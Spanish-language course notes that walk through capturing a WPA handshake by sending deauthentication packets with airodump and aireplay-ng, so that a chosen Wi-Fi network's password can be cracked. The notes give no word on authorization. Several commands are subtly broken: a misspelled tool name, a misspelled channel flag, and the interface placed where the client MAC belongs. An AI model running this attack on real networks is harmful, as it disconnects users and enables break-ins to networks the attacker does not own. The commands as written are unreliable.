# 16. Capturando Handshake - DeAuth

* Continuación clase 15

## ¿Qué es un Handshake?

Un **Handshake** es la conexión que realiza un cliente con un Access Point, con lo que vendría siendo el Router.

Lo que vamos a hacer es conseguir ese Handshake, en el cual gracias a ese Handshake, vamos a poder realizar el ataque.

## Realizando el ataque

Elegimos la red que queremos hacker, copiamos el `BSSID` que vendría siendo la dirección MAC del Access Point, nos vamos a otra terminal:

```bash
sudo airodump-np wlan0mon --chanel 11 --bssid <BSSID> -w /home/<nuestro-usuario>/wordlist/Cap
```

* `--chanel`: Lo obtenemos de `CH`
* `--bssid`: Dirección MAC del Access Point que copiamos
* `-w`: Donde vamos a poner el archivo de captura, donde se va a capturar todo lo que tiene que ver con el Handshake

El Handshake lo obtenemos por medio de un ataque de **des-autenticación**.

## DeAuth

Para hacer esto, nos vamos a otra terminal y ponermos:

```bash
sudo aireplay-ng -0 5 -a <BSSID> -c wlan0mon
```

* `-0`: Es para elegir un ataque de des-autenticación y la cantidad de paquetes de des-autenticaciones queremos hacer
* `-a`: Dirección MAC del Access Point que copiamos, lo sacamos de `BSSID` del comando anterior
* `-c`: Cliente autenticado, lo sacamos de `STATION` del comando anterior

Si hacemos:

```bash
sudo aireplay-ng
```

Podremos ver los modos de ataque que tenemos para coseguir un Handshake, desde `-0` a `-9`.

El mejor es el `-0`, que lo deja desconectado de la red. Lo desconecta por 2 segundos y después lo vuelve a conectar, para que se de la
conexión, osea, esto nos genera el Handshake.

Debemos ver:

```plaintext
...[ WPA handshake: <Handshake> ]
```

Ya con esto podemos hacer el ataque, podemos crackear la red Wi-Fi. También conseguimos el `PMKID`.